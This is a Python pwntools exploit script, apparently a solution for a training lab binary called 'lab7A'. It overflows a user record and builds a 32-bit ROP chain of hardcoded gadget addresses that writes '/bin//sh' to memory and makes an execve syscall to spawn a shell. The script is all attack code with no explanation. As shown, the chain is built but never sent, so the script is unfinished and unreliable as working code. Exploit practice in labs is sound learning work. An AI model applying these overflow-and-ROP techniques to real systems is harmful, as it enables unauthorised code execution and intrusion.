#!/usr/bin/python
from pwn import *
from struct import pack

sh1 = process("./lab7A")
print sh1.recv()
raw_input()

def create_user(length,data):
	sh1.send("1\n")
	sh1.send(str(length))
	sh1.send("\n")
	temp = sh1.recv()
	sh1.send(data)
	sh1.send("\n")
	print sh1.recv()

buff = "A"*128
buff += "\xff"*3
create_user(131,buff)
buff = "B"*15
create_user(20,buff)

# Edit User overflow

sh1.send("2\n")
sh1.send("0\n")
buff = "A"*128
buff += "\xff"*110
#buff += "B"*8
#buff += "C"*4
sh1.send(buff)
print sh1.recv()

p = ''

p += pack('<I', 0x0807030a) # pop edx ; ret
p += pack('<I', 0x080ed000) # @ .data
p += pack('<I', 0x080bd226) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x080a3a1d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0807030a) # pop edx ; ret
p += pack('<I', 0x080ed004) # @ .data + 4
p += pack('<I', 0x080bd226) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x080a3a1d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0807030a) # pop edx ; ret
p += pack('<I', 0x080ed008) # @ .data + 8
p += pack('<I', 0x08055b40) # xor eax, eax ; ret
p += pack('<I', 0x080a3a1d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ed000) # @ .data
p += pack('<I', 0x080e76ad) # pop ecx ; ret
p += pack('<I', 0x080ed008) # @ .data + 8
p += pack('<I', 0x0807030a) # pop edx ; ret
p += pack('<I', 0x080ed008) # @ .data + 8
p += pack('<I', 0x08055b40) # xor eax, eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x0807cd76) # inc eax ; ret
p += pack('<I', 0x08048ef6) # int 0x80

ropchain = p
sh1.interactive()
